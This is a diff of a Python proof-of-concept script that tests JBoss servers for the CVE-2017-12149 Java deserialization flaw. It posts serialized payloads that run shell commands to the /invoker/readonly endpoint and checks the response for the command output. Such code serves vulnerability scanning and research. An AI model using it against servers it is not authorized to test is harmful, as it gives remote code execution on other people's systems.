@@ -23,7 +23,7 @@ ran_a = random.randint(10000000, 20000000)
 ran_b = random.randint(1000000, 2000000)
 ran_check = ran_a - ran_b
 command = ['print goop', 'expr %s - %s' % (ran_a, ran_b), ]
-check = [ran_check, '无法初始化设备 PRN', '??????? PRN', 'Unable to initialize device PRN']
+check = [ran_check, '无法初始化设备 PRN', '??????? PRN', 'Unable to initialize device PRN', 'PRN']
 
 
 def build_command_hex(comm):
@@ -37,13 +37,13 @@ def build_command_hex(comm):
 
 def poc(url):
     proxies = {'http': '127.0.0.1:9999'}
-    result = '目标Weblogic存在JAVA反序列化漏洞,CVE-2016-0638 : %s' % url
+    result = '目标Jboss存在JAVA反序列化漏洞,CVE-2017-12149 : %s' % url
     for start in payload_start:
         for cmd in command:
             payload = binascii.unhexlify(start + build_command_hex(cmd) + payload_end)
             payload_url = "%s/invoker/readonly" % url
             try:
-                req = requests.post(payload_url, data=payload, verify=False, proxies=proxies)
+                req = requests.post(payload_url, data=payload, verify=False, timeout=6, )
                 res = re.search(b'](.*?)RunCheckConfig', req.content, re.DOTALL)
                 if res:
                     ooxx = (res.group(1)).decode('utf-8').strip('\r')
